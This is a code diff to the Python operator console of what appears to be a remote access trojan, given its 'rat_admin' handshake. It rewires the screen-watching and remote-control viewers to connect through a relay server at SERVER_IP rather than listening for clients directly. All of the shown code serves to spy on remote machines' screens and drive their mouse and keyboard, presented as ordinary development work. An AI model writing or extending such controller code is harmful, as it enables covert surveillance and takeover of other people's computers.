@@ -127,15 +127,11 @@ class StreamViewer(threading.Thread):
 
     def run(self):
         windows = {}
-        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         conn = None
         try:
-            # Bind to 0.0.0.0 to accept connections from any interface
-            listener.bind(('0.0.0.0', self.port))
-            listener.listen(1)
-            listener.settimeout(10) # Timeout for client to connect
-            conn, _ = listener.accept()
+            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            conn.connect((SERVER_IP, self.port))
+            conn.sendall(b'rat_admin') # Handshake
 
             while not self._stop_event.is_set():
                 monitor_index, frame_bytes = receive_frame(conn)
@@ -157,7 +153,7 @@ class StreamViewer(threading.Thread):
         except (socket.timeout, OSError):
             print(f"\n[!] Client {self.client_id} failed to connect to stream port.")
         finally:
-            self.cleanup(windows, listener, conn)
+            self.cleanup(windows, None, conn)
 
 
 class ControlViewer(threading.Thread):
@@ -226,21 +222,15 @@ class ControlViewer(threading.Thread):
         except: pass
 
     def run(self):
-        stream_listener, control_listener, stream_conn = None, None, None
+        stream_conn, control_conn = None, None
         try:
-            stream_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            stream_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            stream_listener.bind(('0.0.0.0', self.stream_port))
-            stream_listener.listen(1)
+            stream_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            stream_conn.connect((SERVER_IP, self.stream_port))
+            stream_conn.sendall(b'rat_admin')
 
-            control_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            control_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            control_listener.bind(('0.0.0.0', self.control_port))
-            control_listener.listen(1)
-
-            stream_listener.settimeout(15); control_listener.settimeout(15)
-            stream_conn, _ = stream_listener.accept()
-            self.control_conn, _ = control_listener.accept()
+            self.control_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.control_conn.connect((SERVER_IP, self.control_port))
+            self.control_conn.sendall(b'rat_admin')
 
             cv2.namedWindow(self.window_name, cv2.WINDOW_NORMAL)
             cv2.setMouseCallback(self.window_name, self.mouse_callback)
@@ -259,7 +249,8 @@ class ControlViewer(threading.Thread):
             print(f"\n[!] Client {self.client_id} failed to connect to control/stream ports.")
         finally:
             self.stop()
-            self.cleanup(stream_listener, control_listener, stream_conn)
+            if stream_conn: stream_conn.close()
+            if self.control_conn: self.control_conn.close()
 
     def handle_key_press(self, key):
         if key == ord('q'):
@@ -322,44 +313,74 @@ def find_free_port(start_port):
         port += 1
 
 def start_watch_session(sock, client_id, fps, quality, no_cursor):
-    port = find_free_port(BASE_STREAM_PORT)
-    viewer_thread = StreamViewer(client_id, port)
-
     request = {
         "action": "initiate_watch",
         "client_id": client_id,
-        "stream_port": port,
         "fps": fps,
         "quality": quality,
         "capture_cursor": not no_cursor
     }
 
     if send_json(sock, request):
-        print(f"[+] Instructing client {client_id} to start streaming on port {port}...")
-        print("[+] A new window will appear. Close the window or press 'q' to stop.")
-        viewer_thread.start()
-        # We don't wait for a response here, just assume it worked.
-        # The StreamViewer will time out if the client doesn't connect.
+        print(f"[+] Request sent. Waiting for server bridge...")
+        # Wait for 'watch_ready'
+        try:
+            # Simple loop to consume queue until we find our response
+            # Note: This might consume other messages, effectively hiding them from the main CLI
+            # but since we are in a 'modal' command state, this is acceptable for now.
+            start_wait = time.time()
+            while time.time() - start_wait < 30:
+                try:
+                    msg = message_queue.get(timeout=1)
+                    if msg.get('type') == 'watch_ready' and msg.get('client_id') == client_id:
+                        port = msg.get('port')
+                        print(f"[+] Server bridge ready on port {port}. connecting...")
+                        viewer_thread = StreamViewer(client_id, port)
+                        viewer_thread.start()
+                        return
+                    elif msg.get('type') == 'error':
+                        print(f"[-] Server error: {msg.get('message')}")
+                        return
+                    else:
+                        print(f"[Captured Async Message]: {msg}")
+                except queue.Empty:
+                    continue
+            print("[-] Timeout waiting for server bridge.")
+        except KeyboardInterrupt:
+            print("\n[-] Cancelled.")
     else:
         print(f"[-] Failed to send watch command to server.")
 
 def start_control_session(sock, client_id):
-    stream_port = find_free_port(BASE_STREAM_PORT)
-    control_port = find_free_port(stream_port + 1)
-    
-    viewer_thread = ControlViewer(client_id, stream_port, control_port)
-
     request = {
         "action": "initiate_control",
         "client_id": client_id,
-        "stream_port": stream_port,
-        "control_port": control_port,
     }
 
     if send_json(sock, request):
-        print(f"[+] Instructing client {client_id} to start control session...")
-        print("[+] A new window will appear. Close the window or press 'q' to stop.")
-        viewer_thread.start()
+        print(f"[+] Request sent. Waiting for server bridge...")
+        try:
+            start_wait = time.time()
+            while time.time() - start_wait < 30:
+                try:
+                    msg = message_queue.get(timeout=1)
+                    if msg.get('type') == 'control_ready' and msg.get('client_id') == client_id:
+                        s_port = msg.get('stream_port')
+                        c_port = msg.get('control_port')
+                        print(f"[+] Server bridge ready on ports {s_port}/{c_port}. Connecting...")
+                        viewer_thread = ControlViewer(client_id, s_port, c_port)
+                        viewer_thread.start()
+                        return
+                    elif msg.get('type') == 'error':
+                        print(f"[-] Server error: {msg.get('message')}")
+                        return
+                    else:
+                        print(f"[Captured Async Message]: {msg}")
+                except queue.Empty:
+                    continue
+            print("[-] Timeout waiting for server bridge.")
+        except KeyboardInterrupt:
+            print("\n[-] Cancelled.")
     else:
         print(f"[-] Failed to send control command to server.")
 
